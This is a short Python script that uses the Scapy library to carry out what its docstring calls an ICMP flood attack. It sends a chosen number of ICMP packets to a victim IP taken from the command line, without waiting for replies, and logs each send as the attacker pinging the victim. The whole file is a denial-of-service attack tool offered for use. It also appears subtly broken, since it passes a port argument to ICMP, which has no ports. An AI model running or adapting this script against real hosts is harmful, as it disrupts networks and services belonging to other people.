#Extra packages needed for this to run: Scapy.py
from datetime import datetime
from scapy.all import *





def ping(victim_ip, targetedPort, numOfPackages):
    """
     Ping victim PC performing a ICMP Flood Attack
     The ICMP Flood Attack Aglortihm is based on sending packets 
     as fast as possible without waiting for the victim PCs response 
    """
    for i in range(0,numOfPackages):
        time = datetime.now()
        print("[{0}]: Attacker PC pinging victim PC with IP:{1}".format(time.strftime("%H:%M:%S"),victim_ip))
        send(IP(dst=victim_ip)/ICMP(dport=targetedPort))

if __name__ == "__main__":
    """Cmd args: targetIp, TargetedPort, NumberOfPackagesToSend"""
    print("Preparing to ping victim PC")
    ping(sys.argv[1], sys.argv[2], int(sys.argv[3]))
